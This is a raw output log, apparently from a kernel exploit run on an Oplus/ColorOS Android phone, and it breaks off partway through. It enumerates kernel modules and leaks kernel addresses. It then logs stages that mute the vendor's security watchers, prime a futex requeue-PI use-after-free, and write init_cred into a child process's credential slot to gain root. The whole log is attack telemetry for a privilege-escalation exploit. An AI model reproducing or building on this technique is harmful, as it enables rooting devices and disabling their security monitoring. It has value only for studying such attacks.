+[33m[*] [0mUID0 MOD boot_mode 16384 13 msm_drm,oplus_chg,oplus_chg_v2,cnss2,haptic,icnss2,qcom_hv_haptics,oplus_bsp_tp_comon,oplus_bsp_rfcablemonitor,i2c_msm_geni,cs_press_f71,oplus_saupwk,oplus_phoenix,[permanent], Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_ftm_mode 16384 1 boot_mode, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD pinctrl_msm 53248 98 msm_drm,wcd_core_dlkm,oplus_bsp_tp_comon,i3c_master_msm_geni,pinctrl_diwali,pinctrl_cape,pinctrl_waipio, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_mm_osvelte 69632 4 msm_kgsl,qcom_dma_heaps, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD secure_buffer 40960 12 msm_eva,msm_cvp,audpkt_ion_dlkm,gh_virtio_backend,frpc_adsprpc,msm_kgsl,qrtr_gunyah,msm_memshare,msm_sharedmem,arm_smmu,qcom_dma_heaps,mem_buf_dev, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD gh_rm_drv 65536 10 msm_drm,gh_virtio_backend,qrtr_gunyah,oplus_bsp_tp_comon,gh_mem_notifier,gh_irq_lend,hyp_core_ctl,guestvm_loader,hvc_gunyah,mem_buf_dev, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD device_info 32768 6 msm_drm,oplus_chg,oplus_chg_v2,synaptics_tcm2,oplus_bsp_tp_comon,ufs_qcom,[permanent], Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_project 32768 19 explorer,msm_drm,qca6490,oplus_chg,oplus_chg_v2,oplus_wifismartantenna,cnss2,leds_aw210xx,dump_device_info,oplus_bsp_tp_custom,hung_task_enhance,oplus_sensor,oplus_nfc,panel_event_notifier,oplus_pmicwd,shutdown_detect,oplus_kmsg_wb,oplus_phoenix,device_info,[permanent], Live 0x0000000000000000
+[33m[*] [0mUID0 MOD simcardnum 16384 2 oplus_mdmfeature,oplus_project, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD buildvariant 16384 1 oplus_project, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplusboot 20480 7 oplus_security_guard,oplus_secure_harden,qcom_q6v5_pas,oplus_bsp_tp_comon,dump_device_info,boot_mode,oplus_project, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_task_sched 126976 1 sched_walt, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_sched_assist 225280 10 oplus_binder_strategy,oplus_bsp_uxmem_opt,oplus_bsp_hybridswap_zram,oplus_bsp_dynamic_readahead,oplus_bsp_zram_opt,oplus_schedinfo,oplus_locking_strategy,oplus_bsp_qos_sched,sched_walt,task_overload,[permanent], Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_frame_boost 98304 5 ua_cpu_ioctl,sched_walt,oplus_bsp_task_sched,task_overload,oplus_bsp_sched_assist,[permanent], Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_bsp_eas_opt 40960 3 sched_walt,oplus_bsp_sched_assist,oplus_bsp_frame_boost,[permanent], Live 0x0000000000000000
+[33m[*] [0mUID0 MOD oplus_omrg 57344 1 qcom_cpufreq_hw, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD qcom_scm 118784 31 camera,msm_drm,msm_eva,msm_video,ipam,msm_cvp,oplus_secure_common,qcom_q6v5_pas,coresight_tpdm,msm_kgsl,smcinvoke_mod,qcom_spss,tz_log,phy_msm_snps_hs,phy_msm_snps_eusb2,qcom_cpuss_sleep_stats,eud,guestvm_loader,qseecom_mod,sdhci_msm,core_hang_detect,mdt_loader,arm_smmu,ufs_qcom,qcom_dload_mode,pinc[33m[*] [0mUID0 MOD trl_msm,memory_dump_v2,secure_buffer,crypto_qti_hwkm,qcom_pdc,qcom_wdt_core, Live 0x0000000000000000
+[33m[*] [0mUID0 MOD smem 24576 28 oplus_chg,oplus_chg_v2,ipam,qcom_q6v5_pas,dump_reason,subsystem_sleep_stats,qcom_q6v5,oplus_bsp_rfcablemonitor,microdump_collector,qcom_glink_spss,sysmon_subsystem_stats,pmic_monitor,soc_sleep_stats,rdbg,rproc_qcom_common,smp2p,oplus_sensor,adsp_sleepmon,oplus_bsp_sensor_feedback,qcom_smd,qcom_glink_smem[33m[*] [0mUID0 MOD ,oplus_subsys_sleep_monitor,oplus_mdmfeature,ordump,msm_qmp,socinfo,oplus_project,minidump, Live 0x0000000000000000
+[33m[*] [0mUID0 harvest done nmatch=120 nline=446013
+[33m[*] [0mUID0 harvest modip (perf IP + sysfs sections)
+[33m[*] [0mUID0 sysfs /sys/module/oplus_security_guard/sections/.data..ro_after_init errno=13 [unreadable]
+[33m[*] [0mUID0 sysfs /sys/module/oplus_security_guard/sections/.text errno=13 [unreadable]
+[33m[*] [0mUID0 sysfs /sys/module/oplus_security_guard/sections/.bss errno=13 [unreadable]
+[33m[*] [0mUID0 CFG CONFIG_IKCONFIG=y
+[33m[*] [0mUID0 CFG CONFIG_IKCONFIG_PROC=y
+[33m[*] [0mUID0 CFG # CONFIG_RANDOMIZE_MODULE_REGION_FULL is not set
+[33m[*] [0mUID0 CFG CONFIG_ARCH_HAS_STRICT_MODULE_RWX=y
+[33m[*] [0mUID0 CFG CONFIG_STRICT_MODULE_RWX=y
+[33m[*] [0mUID0 CFG CONFIG_MODULE_UNLOAD=y
+[33m[*] [0mUID0 RAWIP ffffffd685896778
+[33m[*] [0mUID0 RAWIP ffffffd685896778
+[33m[*] [0mUID0 RAWIP ffffffd685896778
+[33m[*] [0mUID0 RAWIP ffffffd685896778
+[33m[*] [0mUID0 RAWIP ffffffd685896778
+[33m[*] [0mUID0 RAWIP 0000005938bb025c
+[33m[*] [0mUID0 HOOKIP ffffffd682eb040c off=40c
+[33m[*] [0mUID0 HOOKIP ffffffd682eb0424 off=424
+[33m[*] [0mUID0 HOOKIP ffffffd682eb040c off=40c
+[33m[*] [0mUID0 HOOKIP ffffffd682eb03f0 off=3f0
+[33m[*] [0mUID0 HOOKIP ffffffd682eb044c off=44c
+[33m[*] [0mUID0 MODPAGE ffffffd685896000 n=426 hook=0
+[33m[*] [0mUID0 MODPAGE ffffffd685881000 n=15 hook=0
+[33m[*] [0mUID0 MODPAGE ffffffd682eb0000 n=9 hook=5
+[33m[*] [0mUID0 modip mode=pmu8_user_xk samp=455 mod=450 hook=5 text=ffffffd682eb0000
+[33m[*] [0mUID0 GBOOT va=ffffffd682eb3000 (core+0x3000, n_hook=5)
+[33m[*] [0mUID0 mute ColorOS watchers
+[33m[*] [0mSTAGE uid0_mute_coloros
+[33m[*] [0m  ip[0]=ffffffd685881d0c getpid=0 svc=0
+[33m[*] [0m  ip[1]=ffffffd685881d0c getpid=0 svc=0
+[33m[*] [0m  ip[2]=ffffffd685881b58 getpid=0 svc=0
+[33m[*] [0m  ip[3]=ffffffd685881cf8 getpid=0 svc=0
+[33m[*] [0mperf pid=0 mode=pmu8_user_xk samp=455 x28=ffffff89c23e0000 x28n=252/252 al64=1
+[33m[*] [0m  ip[0]=000000753c8940e0 getpid=0 svc=0
+[33m[*] [0m  ip[1]=000000753c8be7dc getpid=0 svc=0
+[33m[*] [0m  ip[2]=000000753c912f28 getpid=0 svc=0
+[33m[*] [0m  ip[3]=000000753c8bdac4 getpid=0 svc=0
+[33m[*] [0mperf pid=23415 mode=pmu8_user_xk samp=455 x28=ffffff88bb2ca500 x28n=114/114 al64=1
+[33m[*] [0mUID0 self_x28=ffffff89c23e0000/252 child_x28=ffffff88bb2ca500/114 use=ffffff88bb2ca500 who=child_x28 ucnt=114
+[33m[*] [0mUID0 who=child_x28 pid=23415 raw=ffffff88bb2ca500 wrap=ffffff807b2ca500 ram=2c0000000 comm_off=790
+[33m[*] [0mSTAGE uid0_w2_enter
+[33m[*] [0mUID0 store child_cred slot=ffffff88bb2cac80 val=ffffff802a7e0be0
+[33m[*] [0mSTAGE route_threads_create
+[33m[*] [0mowner blocking on f_pi_chain (deadlock stage for EDEADLK)
+[33m[*] [0mSTAGE before_cmp_requeue_pi
+[33m[*] [0mCMP_REQUEUE_PI ret=-1 errno=35 (EDEADLK/UAF-primed) — want EDEADLK(-35) for UAF
+[33m[*] [0mSTAGE after_cmp_requeue_pi
+[33m[*] [0mWAIT_REQUEUE_PI ret=-1 errno=110 (ETIMEDOUT)
+[33m[*] [0mSTAGE waiter_after_requeue_enter_pselect
+[33m[*] [0mstack SLIDE_CRED PLAIN only-left: *ffffff88bb2cac80 = ffffff802a7e0be0 (init_cred) pc=ffffff802a7e0be0 r=0000000000000000 l=ffffff88bb2cac80
+[33m[*] [0mpselect route setup attempt=1 simple=0 shift=0 wps=5 page=ffffff802abb9d00 fake_lock=ffffff802abb9d00 fake_w0=0000000000000000 fake_task=ffffff802a7cc000
+[33m[*] [0mpselect place tree=ffffff802a7e0be0 pi=0000000000000000 task=ffffff802a7cc000 lock=ffffff802abb9d00 prio=0000000000000003 (expect task≈init/fake lock≈fake_lock)
+[33m[*] [0mpselect pre-select +2ms
+                                                                                         
